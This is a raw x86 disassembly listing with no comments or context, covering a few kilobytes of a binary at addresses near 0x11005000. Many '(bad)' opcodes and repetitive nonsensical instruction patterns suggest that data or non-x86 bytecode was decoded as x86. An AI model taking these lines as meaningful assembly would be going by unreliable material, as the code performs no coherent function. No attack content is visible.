11004d3f:	cmp    BYTE PTR [ecx-0x1],dh
11004d42:	(bad)  
11004d43:	inc    DWORD PTR [esi]
11004d45:	jb     0x11004cf8
11004d47:	add    eax,DWORD PTR [eax]
11004d49:	jo     0x11004dba
11004d4b:	adc    eax,0x160a0000
11004d50:	inc    BYTE PTR [ecx]
11004d52:	or     esp,DWORD PTR [eax]
11004d54:	add    eax,0xd000000
11004d59:	cmp    ah,cl
11004d5b:	(bad)  
11004d5c:	(bad)  
11004d5d:	inc    DWORD PTR [edi]
11004d5f:	sub    eax,0x22090
11004d64:	add    BYTE PTR [eax],al
11004d66:	or     eax,0xfffebe38
11004d6b:	(bad)  
11004d6c:	cmp    BYTE PTR [esi],ah
11004d6e:	(bad)  
11004d6f:	(bad)  
11004d70:	jmp    FWORD PTR [edx]
11004d72:	add    BYTE PTR [eax],al
11004d74:	adc    esi,DWORD PTR [eax]
11004d76:	add    al,BYTE PTR [eax]
11004d78:	adc    al,0x0
11004d7a:	add    BYTE PTR [eax],al
11004d7c:	add    BYTE PTR [eax],al
11004d7e:	add    BYTE PTR [eax],al
11004d80:	add    BYTE PTR [edi],dl
11004d82:	or     BYTE PTR [ebx],0x0
11004d85:	add    BYTE PTR [esi+edi*2],al
11004d88:	add    eax,DWORD PTR [eax]
11004d8a:	add    BYTE PTR [edi+edx*1],al
11004d8d:	outs   dx,DWORD PTR ds:[esi]
11004d8e:	aaa    
11004d8f:	add    BYTE PTR [eax],al
11004d91:	or     al,BYTE PTR [eax]
11004d93:	sub    dl,BYTE PTR [ebx]
11004d95:	xor    BYTE PTR [edx],al
11004d97:	add    BYTE PTR ds:0x0,ah
11004d9d:	add    BYTE PTR [eax],al
11004d9f:	add    BYTE PTR [edi],dl
11004da1:	sub    eax,DWORD PTR [ebx]
11004da3:	push   ss
11004da4:	sub    eax,DWORD PTR [eax]
11004da6:	sub    al,0x0
11004da8:	add    BYTE PTR [edx],al
11004daa:	sub    BYTE PTR [ecx],cl
11004dac:	add    BYTE PTR [eax],al
11004dae:	push   es
11004daf:	add    BYTE PTR [edx],al
11004db1:	sub    BYTE PTR [edi],al
11004db3:	add    BYTE PTR [eax],al
11004db5:	push   es
11004db6:	push   ss
11004db7:	inc    BYTE PTR [ecx]
11004db9:	or     BYTE PTR [esi],0x0
11004dbc:	add    BYTE PTR [edi+edx*1],al
11004dbf:	or     BYTE PTR [edi],0x0
11004dc2:	add    BYTE PTR [edx+ebp*1],al
11004dc5:	add    BYTE PTR [eax],al
11004dc7:	add    BYTE PTR [ebx],dl
11004dc9:	xor    BYTE PTR [edx],al
11004dcb:	add    BYTE PTR ds:0x0,ah
11004dd1:	add    BYTE PTR [eax],al
11004dd3:	add    BYTE PTR [edi],dl
11004dd5:	sub    eax,DWORD PTR [ebx]
11004dd7:	push   ss
11004dd8:	sub    eax,DWORD PTR [eax]
11004dda:	sub    al,0x0
11004ddc:	add    BYTE PTR [edx],al
11004dde:	sub    BYTE PTR [ecx],cl
11004de0:	add    BYTE PTR [eax],al
11004de2:	push   es
11004de3:	add    BYTE PTR [edx],al
11004de5:	sub    BYTE PTR [edi],al
11004de7:	add    BYTE PTR [eax],al
11004de9:	push   es
11004dea:	push   ss
11004deb:	inc    BYTE PTR [ecx]
11004ded:	or     BYTE PTR [eax+eax*1],0x0
11004df1:	add    al,0x17
11004df3:	or     BYTE PTR ds:0x2a040000,0x0
11004dfa:	add    BYTE PTR [eax],al
11004dfc:	adc    esi,DWORD PTR [eax]
11004dfe:	add    al,0x0
11004e00:	das    
11004e01:	add    BYTE PTR [eax],al
11004e03:	add    BYTE PTR [esi],al
11004e05:	add    BYTE PTR [eax],al
11004e07:	adc    DWORD PTR [edi],edx
11004e09:	sub    eax,DWORD PTR [ebx]
11004e0b:	push   ss
11004e0c:	sub    eax,DWORD PTR [eax]
11004e0e:	sub    al,0x0
11004e10:	add    BYTE PTR [eax],ch
11004e12:	sbb    eax,DWORD PTR [eax]
11004e14:	add    BYTE PTR [edx],cl
11004e16:	jb     0x11004dd3
11004e18:	add    eax,DWORD PTR [eax]
11004e1a:	jo     0x11004e8b
11004e1c:	sbb    al,0x0
11004e1e:	add    BYTE PTR [edx],cl
11004e20:	pop    ss
11004e21:	lea    edx,[eax+eax*1]
11004e24:	add    BYTE PTR [ecx],al
11004e26:	or     al,BYTE PTR [esi]
11004e28:	push   ss
11004e29:	add    ah,BYTE PTR [edx+0x1d2806]
11004e2f:	add    BYTE PTR [edx],cl
11004e31:	jae    0x11004e51
11004e33:	add    BYTE PTR [eax],al
11004e35:	or     bh,BYTE PTR [edx+0x0]
11004e38:	adc    esi,DWORD PTR [eax]
11004e3a:	add    al,0x0
11004e3c:	mov    ebx,0x6000000
11004e41:	add    BYTE PTR [eax],al
11004e43:	adc    DWORD PTR [edi],edx
11004e45:	sub    eax,DWORD PTR [ebx]
11004e47:	push   ss
11004e48:	sub    eax,DWORD PTR [eax]
11004e4a:	sub    al,0x0
11004e4c:	add    BYTE PTR [edx],al
11004e4e:	jb     0x11004e2d
11004e50:	add    eax,DWORD PTR [eax]
11004e52:	jo     0x11004ec3
11004e54:	pop    eax
11004e55:	add    BYTE PTR [eax],al
11004e57:	or     al,BYTE PTR [eax]
11004e59:	add    dl,BYTE PTR [esi]
11004e5b:	outs   dx,DWORD PTR ds:[esi]
11004e5c:	and    al,0x0
11004e5e:	add    BYTE PTR [edx],cl
11004e60:	add    BYTE PTR [edx],al
11004e62:	push   ss
11004e63:	outs   dx,DWORD PTR ds:[esi]
11004e64:	and    eax,0xa0000
11004e69:	add    dl,BYTE PTR [esi]
11004e6b:	outs   dx,DWORD PTR ds:[esi]
11004e6c:	add    BYTE PTR es:[eax],al
11004e6f:	or     al,BYTE PTR [eax]
11004e71:	add    dl,BYTE PTR [edi]
11004e73:	outs   dx,DWORD PTR ds:[esi]
11004e74:	pop    ecx
11004e75:	add    BYTE PTR [eax],al
11004e77:	or     al,BYTE PTR [eax]
11004e79:	add    dh,BYTE PTR [edx-0x1b]
11004e7c:	add    eax,DWORD PTR [eax]
11004e7e:	jo     0x11004efe
11004e80:	xor    DWORD PTR [eax],eax
11004e82:	add    BYTE PTR [edx],cl
11004e84:	mov    WORD PTR [edx],fs
11004e86:	add    BYTE PTR [eax],al
11004e88:	add    DWORD PTR [edx-0x1],esi
11004e8b:	add    eax,DWORD PTR [eax]
11004e8d:	jo     0x11004eb7
11004e8f:	xor    al,BYTE PTR [eax]
11004e91:	add    BYTE PTR [edx],cl
11004e93:	outs   dx,DWORD PTR ds:[esi]
11004e94:	push   ebp
11004e95:	add    BYTE PTR [eax],al
11004e97:	or     al,BYTE PTR [eax]
11004e99:	add    bl,BYTE PTR [ebx]
11004e9b:	lea    edx,[eax+eax*1]
11004e9e:	add    BYTE PTR [ecx],al
11004ea0:	or     al,BYTE PTR [esi]
11004ea2:	push   ss
11004ea3:	jb     0x11004e8a
11004ea5:	add    eax,DWORD PTR [eax]
11004ea7:	jo     0x11004e4b
11004ea9:	push   es
11004eaa:	pop    ss
11004eab:	jle    0x11004ede
11004ead:	add    BYTE PTR [eax],al
11004eaf:	or     cl,BYTE PTR [edx+eiz*1-0x5dff0000]
11004eb6:	push   es
11004eb7:	sbb    BYTE PTR [edx-0x1],dh
11004eba:	add    eax,DWORD PTR [eax]
11004ebc:	jo     0x11004e60
11004ebe:	push   es
11004ebf:	sbb    DWORD PTR [esi+0x31],edi
11004ec2:	add    BYTE PTR [eax],al
11004ec4:	or     cl,BYTE PTR [edx+eiz*1-0x5dff0000]
11004ecb:	push   es
11004ecc:	sbb    dh,BYTE PTR [edx+0x17]
11004ecf:	add    al,0x0
11004ed1:	jo     0x11004e75
11004ed3:	push   es
11004ed4:	sub    BYTE PTR [edx+0x0],bl
11004ed7:	add    BYTE PTR [edx],cl
11004ed9:	outs   dx,DWORD PTR ds:[esi]
11004eda:	push   esi
11004edb:	add    BYTE PTR [eax],al
11004edd:	or     al,BYTE PTR [eax]
11004edf:	add    dl,BYTE PTR [esi]
11004ee1:	outs   dx,DWORD PTR ds:[esi]
11004ee2:	cmp    BYTE PTR [eax],al
11004ee4:	add    BYTE PTR [edx],cl
11004ee6:	add    BYTE PTR [edx],al
11004ee8:	push   ss
11004ee9:	outs   dx,DWORD PTR ds:[esi]
11004eea:	aaa    
11004eeb:	add    BYTE PTR [eax],al
11004eed:	or     al,BYTE PTR [eax]
11004eef:	add    dl,BYTE PTR [esi]
11004ef1:	outs   dx,DWORD PTR ds:[esi]
11004ef2:	push   edi
11004ef3:	add    BYTE PTR [eax],al
11004ef5:	or     al,BYTE PTR [eax]
11004ef7:	add    ch,BYTE PTR [edi+0x5b]
11004efa:	add    BYTE PTR [eax],al
11004efc:	or     al,BYTE PTR [eax]
11004efe:	sub    al,BYTE PTR [eax]
11004f00:	adc    esi,DWORD PTR [eax]
11004f02:	add    al,0x0
11004f04:	popf   
11004f05:	add    DWORD PTR [eax],eax
11004f07:	add    BYTE PTR [ebx],cl
11004f09:	add    BYTE PTR [eax],al
11004f0b:	adc    DWORD PTR [ebx],ebp
11004f0d:	or     BYTE PTR ds:[ebp+0xe],al
11004f11:	add    BYTE PTR [eax],al
11004f13:	add    BYTE PTR [eax],bh
11004f15:	add    DWORD PTR [eax],eax
11004f17:	add    BYTE PTR [ecx],dl
11004f19:	add    BYTE PTR [eax],al
11004f1b:	add    BYTE PTR [ecx+0x1],cl
11004f1e:	add    BYTE PTR [eax],al
11004f20:	xor    BYTE PTR [eax],al
11004f22:	add    BYTE PTR [eax],al
11004f24:	add    BYTE PTR es:[eax],al
11004f27:	add    BYTE PTR [ebx],bh
11004f29:	add    BYTE PTR [eax],al
11004f2b:	add    BYTE PTR [edx+0x1],bl
11004f2e:	add    BYTE PTR [eax],al
11004f30:	push   ebx
11004f31:	add    BYTE PTR [eax],al
11004f33:	add    BYTE PTR [ebx],cl
11004f35:	add    DWORD PTR [eax],eax
11004f37:	add    BYTE PTR [eax+eax*1+0x900000],ch
11004f3e:	add    BYTE PTR [eax],al
11004f40:	pusha  
11004f41:	add    BYTE PTR [eax],al
11004f43:	add    BYTE PTR [ebx+0x72000000],al
11004f49:	add    BYTE PTR [eax],al
11004f4b:	add    BYTE PTR [eax],al
11004f4d:	pop    ss
11004f4e:	sub    eax,DWORD PTR [ebx]
11004f50:	push   ss
11004f51:	sub    eax,DWORD PTR [eax]
11004f53:	sub    al,0x0
11004f55:	and    BYTE PTR [ecx],al
11004f57:	add    BYTE PTR [eax],al
11004f59:	add    BYTE PTR [ebx+ebp*1],cl
11004f5c:	mov    cl,0x3
11004f5e:	jb     0x11004eed
11004f60:	add    DWORD PTR [eax],eax
11004f62:	jo     0x11004fd3
11004f64:	pop    ds
11004f65:	add    BYTE PTR [eax],al
11004f67:	or     ch,BYTE PTR ds:0x42037
11004f6d:	add    BYTE PTR [eax],al
11004f6f:	or     al,0x2b
11004f71:	pushf  
11004f72:	sub    ebx,DWORD PTR [ebp+0x20]
11004f75:	add    eax,DWORD PTR [eax]
11004f77:	add    BYTE PTR [eax],al
11004f79:	or     al,0x2b
11004f7b:	xchg   edx,eax
11004f7c:	pop    ss
11004f7d:	sub    esi,DWORD PTR [ebx]
11004f7f:	and    BYTE PTR ds:0xc000000,al
11004f85:	sub    eax,DWORD PTR [edi+0xcd7203]
11004f8b:	add    BYTE PTR [eax+0x6f],dh
11004f8e:	pop    ds
11004f8f:	add    BYTE PTR [eax],al
11004f91:	or     ch,BYTE PTR ds:0x720e0
11004f97:	add    BYTE PTR [eax],al
11004f99:	or     al,0x38
11004f9b:	outs   dx,DWORD PTR ds:[esi]
11004f9c:	(bad)  
11004f9d:	(bad)  
11004f9e:	jmp    FWORD PTR [ebx]
11004fa0:	dec    esp
11004fa1:	and    BYTE PTR [ebx],cl
11004fa3:	add    BYTE PTR [eax],al
11004fa5:	add    BYTE PTR [eax+edi*1],cl
11004fa8:	(bad)  
11004fa9:	(bad)  
11004faa:	(bad)  
11004fab:	call   DWORD PTR [edi]
11004fad:	cmp    bh,dl
11004faf:	add    BYTE PTR [eax],al
11004fb1:	add    BYTE PTR [edx],cl
11004fb3:	and    BYTE PTR ds:0xc000000,cl
11004fb9:	cmp    BYTE PTR [eax-0x1],dl
11004fbc:	(bad)  
11004fbd:	inc    DWORD PTR [esi]
11004fbf:	cmp    ah,ah
11004fc1:	add    BYTE PTR [eax],al
11004fc3:	add    BYTE PTR [eax],ah
11004fc5:	or     al,0x0
11004fc7:	add    BYTE PTR [eax],al
11004fc9:	or     al,0x38
11004fcb:	aas    
11004fcc:	(bad)  
11004fcd:	(bad)  
11004fce:	jmp    FWORD PTR [ebx]
11004fd0:	xor    eax,0xa20
11004fd5:	add    BYTE PTR [eax+edi*1],cl
11004fd8:	xor    bh,bh
11004fda:	(bad)  
11004fdb:	inc    DWORD PTR [edx]
11004fdd:	outs   dx,DWORD PTR ds:[esi]
11004fde:	pop    esp
11004fdf:	add    BYTE PTR [eax],al
11004fe1:	or     dl,BYTE PTR [esi+edi*8]
11004fe4:	add    DWORD PTR [esi],edx
11004fe6:	inc    BYTE PTR [ecx]
11004fe8:	cmp    BYTE PTR [eax+eax*1+0x9200000],bl
11004fef:	add    BYTE PTR [eax],al
11004ff1:	add    BYTE PTR [eax+edi*1],cl
11004ff4:	push   ss
11004ff5:	(bad)  
11004ff6:	(bad)  
11004ff7:	inc    DWORD PTR [edx]
11004ff9:	outs   dx,DWORD PTR ds:[esi]
11004ffa:	pop    ebp
11004ffb:	add    BYTE PTR [eax],al
11004ffd:	or     dl,BYTE PTR [esi+edi*8]
11005000:	add    DWORD PTR [esi],edx
11005002:	inc    BYTE PTR [ecx]
11005004:	sub    ebp,DWORD PTR [edx+eax*1+0x148d1b]
1100500b:	add    BYTE PTR [ecx],al
1100500d:	or     eax,DWORD PTR [edi]
1100500f:	push   ss
11005010:	sub    BYTE PTR [esi+0x0],bl
11005013:	add    BYTE PTR [edx],cl
11005015:	mov    ds:0x317e1707,al
1100501a:	add    BYTE PTR [eax],al
1100501c:	or     cl,BYTE PTR [edx+eiz*1-0x5dff0000]
11005023:	pop    es
11005024:	sbb    BYTE PTR [edx-0x1],dh
11005027:	add    eax,DWORD PTR [eax]
11005029:	jo     0x11004fcd
1100502b:	pop    es
1100502c:	sbb    DWORD PTR [esi+0x31],edi
1100502f:	add    BYTE PTR [eax],al
11005031:	or     cl,BYTE PTR [edx+eiz*1-0x5dff0000]
11005038:	pop    es
11005039:	sbb    dh,BYTE PTR [edx+0x27]
1100503c:	add    al,0x0
1100503e:	jo     0x11004fe2
11005040:	pop    es
11005041:	sub    BYTE PTR [edx+0x0],bl
11005044:	add    BYTE PTR [edx],cl
11005046:	outs   dx,DWORD PTR ds:[esi]
11005047:	push   esi
11005048:	add    BYTE PTR [eax],al
1100504a:	or     al,BYTE PTR [eax]
1100504c:	and    BYTE PTR [eax],cl
1100504e:	add    BYTE PTR [eax],al
11005050:	add    BYTE PTR [eax+edi*1],cl
11005053:	mov    bh,0xfe
11005055:	(bad)  
11005056:	jmp    FWORD PTR [ebx]
11005058:	dec    edi
11005059:	add    ch,BYTE PTR [eax]
1100505b:	pop    esi
1100505c:	add    BYTE PTR [eax],al
1100505e:	or     bh,BYTE PTR [esi+0x31]
11005061:	add    BYTE PTR [eax],al
11005063:	or     cl,BYTE PTR [edx+eiz*1+0x72010000]
1100506a:	inc    DWORD PTR [ebx]
1100506c:	add    BYTE PTR [eax+0x28],dh
1100506f:	xor    al,BYTE PTR [eax]
11005071:	add    BYTE PTR [edx],cl
11005073:	outs   dx,DWORD PTR ds:[esi]
11005074:	push   ebp
11005075:	add    BYTE PTR [eax],al
11005077:	or     al,BYTE PTR [eax]
11005079:	and    BYTE PTR [eax],al
1100507b:	add    BYTE PTR [eax],al
1100507d:	add    BYTE PTR [eax+edi*1],cl
11005080:	mov    bh,dh
11005082:	(bad)  
11005083:	(bad)  
11005084:	cmp    dh,dh
11005086:	(bad)  
11005087:	(bad)  
11005088:	dec    DWORD PTR [edx]
1100508a:	and    BYTE PTR [edx],al
1100508c:	add    BYTE PTR [eax],al
1100508e:	add    BYTE PTR [eax+edi*1],cl
11005091:	jns    0x11005091
11005093:	(bad)  
11005094:	inc    DWORD PTR [esi]
11005096:	cmp    ah,ah
11005098:	(bad)  
11005099:	(bad)  
1100509a:	jmp    DWORD PTR [eax]
1100509c:	push   es
1100509d:	add    BYTE PTR [eax],al
1100509f:	add    BYTE PTR [eax+edi*1],cl
110050a2:	push   0x2bfffffe
110050a7:	mov    cl,0x2a
110050a9:	add    BYTE PTR [eax],al
110050ab:	add    BYTE PTR [ebx],dl
110050ad:	xor    BYTE PTR [eax+eax*1],al
110050b0:	xor    eax,DWORD PTR [eax]
110050b2:	add    BYTE PTR [eax],al
110050b4:	or     al,0x0
110050b6:	add    BYTE PTR [ecx],dl
110050b8:	pop    ss
110050b9:	sub    eax,DWORD PTR [ebx]
110050bb:	push   ss
110050bc:	sub    eax,DWORD PTR [eax]
110050be:	sub    al,0x0
110050c0:	add    BYTE PTR [esi+0x3],bh
110050c3:	add    BYTE PTR [eax],al
110050c5:	add    al,0x6f
110050c7:	pop    edi
110050c8:	add    BYTE PTR [eax],al
110050ca:	or     bl,BYTE PTR [ecx]
110050cc:	pop    ss
110050cd:	jae    0x1100512f
110050cf:	add    BYTE PTR [eax],al
110050d1:	or     cl,BYTE PTR [edx]
110050d3:	jle    0x110050da
110050d5:	add    BYTE PTR [eax],al
110050d7:	add    al,0x16
110050d9:	inc    BYTE PTR [ecx]
110050db:	or     eax,DWORD PTR [edx]
110050dd:	jle    0x110050e2
110050df:	add    BYTE PTR [eax],al
110050e1:	add    al,0x6
110050e3:	pop    es
110050e4:	outs   dx,DWORD PTR ds:[esi]
110050e5:	popa   
110050e6:	add    BYTE PTR [eax],al
110050e8:	or     ah,BYTE PTR [esi]
110050ea:	sub    al,BYTE PTR [eax]
110050ec:	adc    esi,DWORD PTR [eax]
110050ee:	add    eax,DWORD PTR [eax]
110050f0:	pop    ds
110050f1:	add    al,BYTE PTR [eax]
110050f3:	add    BYTE PTR [eax],cl
110050f5:	add    BYTE PTR [eax],al
110050f7:	adc    DWORD PTR [ebx],ebp
110050f9:	dec    esi
110050fa:	pop    es
110050fb:	inc    ebp
110050fc:	adc    al,BYTE PTR [eax]
110050fe:	add    BYTE PTR [eax],al
11005100:	xchg   ecx,eax
11005101:	add    BYTE PTR [eax],al
11005103:	add    BYTE PTR [ebp+0x7000001],cl
11005109:	add    DWORD PTR [eax],eax
1100510b:	add    dl,bl
1100510d:	add    BYTE PTR [eax],al
1100510f:	add    BYTE PTR [ebp+0x1],ch
11005112:	add    BYTE PTR [eax],al
11005114:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11005115:	add    BYTE PTR [eax],al
11005117:	add    BYTE PTR [edi+0x1],bl
1100511a:	add    BYTE PTR [eax],al
1100511c:	leave  
1100511d:	add    DWORD PTR [eax],eax
1100511f:	add    cl,bh
11005121:	add    BYTE PTR [eax],al
11005123:	add    cl,cl
11005125:	add    BYTE PTR [eax],al
11005127:	add    BYTE PTR [ecx+0x0],dl
1100512a:	add    BYTE PTR [eax],al
1100512c:	sbb    eax,DWORD PTR [eax]
1100512e:	add    BYTE PTR [eax],al
11005130:	push   0x0
11005132:	add    BYTE PTR [eax],al
11005134:	sahf   
11005135:	add    DWORD PTR [eax],eax
11005137:	add    BYTE PTR [ebx],ch
11005139:	add    DWORD PTR [eax],eax
1100513b:	add    BYTE PTR [ecx+eax*1],bh
1100513e:	add    BYTE PTR [eax],al
11005140:	js     0x11005142
11005142:	add    BYTE PTR [eax],al
11005144:	add    BYTE PTR es:[eax],al
11005147:	add    BYTE PTR [eax],al
11005149:	add    dh,BYTE PTR [edx+0x37]
1100514c:	add    al,0x0
1100514e:	jo     0x110051bf
11005150:	pop    ds
11005151:	add    BYTE PTR [eax],al
11005153:	or     dl,BYTE PTR [esi+edi*8]
11005156:	add    DWORD PTR [esi],edx
11005158:	inc    BYTE PTR [ecx]
1100515a:	or     ah,BYTE PTR [eax]
1100515c:	or     eax,DWORD PTR [eax]
1100515e:	add    BYTE PTR [eax],al
11005160:	or     ebp,DWORD PTR [ebx]
11005162:	xchg   edi,eax
11005163:	push   es
11005164:	sub    eax,0x11205f
11005169:	add    BYTE PTR [eax],al
1100516b:	or     ebp,DWORD PTR [ebx]
1100516d:	mov    WORD PTR [eax],?
1100516f:	mov    cl,0x0
11005171:	add    BYTE PTR [eax],al
11005173:	add    dh,BYTE PTR [edx+0x55]
11005176:	add    al,0x0
11005178:	jo     0x110051f8
1100517a:	add    al,0x0
1100517c:	add    BYTE PTR [eax+ebp*1],al
1100517f:	sub    al,BYTE PTR [eax]
11005181:	add    BYTE PTR [edx],cl
11005183:	sub    BYTE PTR [eax],dh
11005185:	add    BYTE PTR [eax],al
11005187:	or     ch,BYTE PTR [edi+0x34]
1100518a:	add    BYTE PTR [eax],al
1100518c:	or     al,BYTE PTR [eax]
1100518e:	and    BYTE PTR [edx],cl
11005190:	add    BYTE PTR [eax],al
11005192:	add    BYTE PTR [ebx],cl
11005194:	cmp    BYTE PTR [ecx-0x1],ah
11005197:	(bad)  
11005198:	(bad)  
11005199:	cmp    BYTE PTR [ebp+0x7e000000],ah
1100519f:	add    al,0x0
110051a1:	add    BYTE PTR [esp+edx*1],al
110051a4:	inc    BYTE PTR [ecx]
110051a6:	or     ah,BYTE PTR [eax]
110051a8:	or     al,0x0
110051aa:	add    BYTE PTR [eax],al
110051ac:	or     edi,DWORD PTR [eax]
110051ae:	dec    eax
110051af:	(bad)  
110051b0:	(bad)  
110051b1:	inc    DWORD PTR [esi]
110051b3:	sub    eax,0x10203f
110051b8:	add    BYTE PTR [eax],al
110051ba:	or     edi,DWORD PTR [eax]
110051bc:	cmp    bh,bh
110051be:	(bad)  
110051bf:	(bad)  
110051c0:	cmp    dl,dh
110051c2:	add    BYTE PTR [eax],al
110051c4:	add    BYTE PTR [esi+0x7],bh
110051c7:	add    BYTE PTR [eax],al
110051c9:	add    al,0x14
110051cb:	inc    BYTE PTR [ecx]
110051cd:	or     ah,BYTE PTR [eax]
110051cf:	add    BYTE PTR [eax],al
110051d1:	add    BYTE PTR [eax],al
110051d3:	or     edi,DWORD PTR [eax]
110051d5:	and    edi,edi
110051d7:	(bad)  
110051d8:	call   DWORD PTR [edi]
110051da:	sub    eax,DWORD PTR [ebx]
110051dc:	push   ss
110051dd:	sub    eax,DWORD PTR [eax]
110051df:	sub    al,0x0
110051e1:	push   es
110051e2:	sub    eax,0x520ba
110051e7:	add    BYTE PTR [eax],al
110051e9:	or     edi,DWORD PTR [eax]
110051eb:	or     edi,edi
110051ed:	(bad)  
110051ee:	(bad)  
110051ef:	cmp    BYTE PTR [ebp+0x2000000],dl
110051f5:	jb     0x11005260
110051f7:	add    al,0x0
110051f9:	jo     0x1100526a
110051fb:	pop    ds
110051fc:	add    BYTE PTR [eax],al
110051fe:	or     dl,BYTE PTR [esi+edi*8]
11005201:	add    DWORD PTR [esi],edx
11005203:	inc    BYTE PTR [ecx]
11005205:	or     ah,BYTE PTR [eax]
11005207:	or     DWORD PTR [eax],eax
11005209:	add    BYTE PTR [eax],al
1100520b:	or     edi,DWORD PTR [eax]
1100520d:	jmp    0x18005210
11005212:	cmp    bh,bh
11005214:	add    BYTE PTR [eax],al
11005216:	add    BYTE PTR [eax],ah
11005218:	add    eax,DWORD PTR [eax]
1100521a:	add    BYTE PTR [eax],al
1100521c:	or     edi,DWORD PTR [eax]
1100521e:	fdivr  st,st(6)
11005220:	(bad)  
11005221:	jmp    FWORD PTR [ebx]
11005223:	sub    eax,0x4377202
11005228:	add    BYTE PTR [eax+0x3],dh
1100522b:	outs   dx,DWORD PTR ds:[esi]
1100522c:	bound  eax,QWORD PTR [eax]
1100522e:	add    BYTE PTR [edx],cl
11005230:	outs   dx,DWORD PTR ds:[esi]
11005231:	xor    al,0x0
11005233:	add    BYTE PTR [edx],cl
11005235:	add    BYTE PTR [eax],ah
11005237:	or     BYTE PTR [eax],al
11005239:	add    BYTE PTR [eax],al
1100523b:	or     edi,DWORD PTR [eax]
1100523d:	mov    ecx,0x2bfffffe
11005242:	add    BYTE PTR [eax],0x20
11005245:	add    al,BYTE PTR [eax]
11005247:	add    BYTE PTR [eax],al
11005249:	or     edi,DWORD PTR [eax]
1100524b:	stos   DWORD PTR es:[edi],eax
1100524c:	(bad)  
1100524d:	(bad)  
1100524e:	jmp    FWORD PTR [ebx]
11005250:	mov    ds:0x4697202,eax
11005255:	add    BYTE PTR [eax+0x16],dh
11005258:	sub    BYTE PTR [ebx+0x0],ah
1100525b:	add    BYTE PTR [edx],cl
1100525d:	sub    BYTE PTR [edx],ch
1100525f:	add    BYTE PTR [eax],al
11005261:	or     ch,BYTE PTR [edi+0x34]
11005264:	add    BYTE PTR [eax],al
11005266:	or     al,BYTE PTR [eax]
11005268:	and    BYTE PTR [esi],cl
1100526a:	add    BYTE PTR [eax],al
1100526c:	add    BYTE PTR [ebx],cl
1100526e:	cmp    BYTE PTR [edi+0x38fffffe],al
11005274:	sahf   
11005275:	add    BYTE PTR [eax],al
11005277:	add    BYTE PTR [eax],al
11005279:	and    BYTE PTR [edi],cl
1100527b:	add    BYTE PTR [eax],al
1100527d:	add    BYTE PTR [ebx],cl
1100527f:	cmp    BYTE PTR [esi-0x2],dh
11005282:	(bad)  
11005283:	(bad)  
11005284:	cmp    BYTE PTR [ebx-0x1],ch
11005287:	(bad)  
11005288:	inc    DWORD PTR [eax]
1100528a:	add    dh,BYTE PTR [edx+0x55]
1100528d:	add    al,0x0
1100528f:	jo     0x11005300
11005291:	pop    ds
11005292:	add    BYTE PTR [eax],al
11005294:	or     dl,BYTE PTR [esi+edi*8]
11005297:	add    DWORD PTR [esi],edx
11005299:	inc    BYTE PTR [ecx]
1100529b:	or     ah,BYTE PTR [eax]
1100529d:	push   es
1100529e:	add    BYTE PTR [eax],al
110052a0:	add    BYTE PTR [ebx],cl
110052a2:	cmp    BYTE PTR [ebx-0x2],dl
110052a5:	(bad)  
110052a6:	inc    DWORD PTR [esi]
110052a8:	sub    eax,0x420ce
110052ad:	add    BYTE PTR [eax],al
110052af:	or     edi,DWORD PTR [eax]
110052b1:	inc    ebp
110052b2:	(bad)  
110052b3:	(bad)  
110052b4:	jmp    FWORD PTR [ebx]
110052b6:	xor    al,0x0
110052b8:	add    dh,BYTE PTR [edx+0x55]
110052bb:	add    al,0x0
110052bd:	jo     0x1100532e
110052bf:	pop    ds
110052c0:	add    BYTE PTR [eax],al
110052c2:	or     dl,BYTE PTR [esi+edi*8]
110052c5:	add    DWORD PTR [esi],edx
110052c7:	inc    BYTE PTR [ecx]
110052c9:	or     ah,BYTE PTR [eax]
110052cb:	add    DWORD PTR [eax],eax
110052cd:	add    BYTE PTR [eax],al
110052cf:	or     edi,DWORD PTR [eax]
110052d1:	and    eax,0x6fffffe
110052d6:	cmp    ch,BYTE PTR [eax-0x1]
110052d9:	(bad)  
110052da:	jmp    DWORD PTR [eax]
110052dc:	or     eax,0xb000000
110052e1:	cmp    BYTE PTR [esi+edi*8],dl
110052e4:	(bad)  
110052e5:	(bad)  
110052e6:	cmp    BYTE PTR [eax+0x2fffffe],cl
110052ec:	jb     0x11005343
110052ee:	add    al,0x0
110052f0:	jo     0x11005370
110052f2:	pop    es
110052f3:	add    BYTE PTR [eax],al
110052f5:	add    al,0x28
110052f7:	sub    al,BYTE PTR [eax]
110052f9:	add    BYTE PTR [edx],cl
110052fb:	sub    BYTE PTR [eax],dh
110052fd:	add    BYTE PTR [eax],al
110052ff:	or     ch,BYTE PTR [edi+0x34]
11005302:	add    BYTE PTR [eax],al
11005304:	or     al,BYTE PTR [eax]
11005306:	and    BYTE PTR [edi],al
11005308:	add    BYTE PTR [eax],al
1100530a:	add    BYTE PTR [ebx],cl
1100530c:	cmp    cl,ch
1100530e:	std    
1100530f:	(bad)  
11005310:	(bad)  
11005311:	cmp    BYTE PTR [edx-0x1],ah
11005314:	(bad)  
11005315:	jmp    FWORD PTR [edx]
11005317:	add    BYTE PTR [ebx],bl
11005319:	xor    BYTE PTR [ebx],al
1100531b:	add    BYTE PTR [ebp+0xd000000],al
11005321:	add    BYTE PTR [eax],al
11005323:	adc    DWORD PTR [eax],eax
11005325:	adc    al,0xa
11005327:	sub    eax,DWORD PTR [eax]
11005329:	add    BYTE PTR [esi+0x7],bh
1100532c:	add    BYTE PTR [eax],al
1100532e:	add    al,0x18
11005330:	sbb    BYTE PTR [ebx+0x60],dh
11005333:	add    BYTE PTR [eax],al
11005335:	or     cl,BYTE PTR [edx]
11005337:	jae    0x1100539d
11005339:	add    BYTE PTR [eax],al
1100533b:	or     cl,BYTE PTR [ebx]
1100533d:	pop    es
1100533e:	jle    0x11005343
11005340:	add    BYTE PTR [eax],al
11005342:	add    al,0x6
11005344:	outs   dx,DWORD PTR ds:[esi]
11005345:	add    BYTE PTR gs:[eax],al
11005348:	or     al,BYTE PTR [eax]
1100534a:	jle    0x1100534f
1100534c:	add    BYTE PTR [eax],al
1100534e:	add    al,0x7e
11005350:	pop    es
11005351:	add    BYTE PTR [eax],al
11005353:	add    al,0x6f
11005355:	sub    eax,DWORD PTR [eax]
11005357:	add    BYTE PTR [edx],cl
11005359:	add    BYTE PTR [eax],al
1100535b:	fiadd  WORD PTR [edx+0x2b]
1100535e:	adc    cl,BYTE PTR [ecx]
11005360:	inc    ebp
11005361:	add    eax,DWORD PTR [eax]
11005363:	add    BYTE PTR [eax],al
11005365:	sbb    DWORD PTR [eax],eax
11005367:	add    BYTE PTR [eax],al
11005369:	sub    al,BYTE PTR [eax]
1100536b:	add    BYTE PTR [eax],al
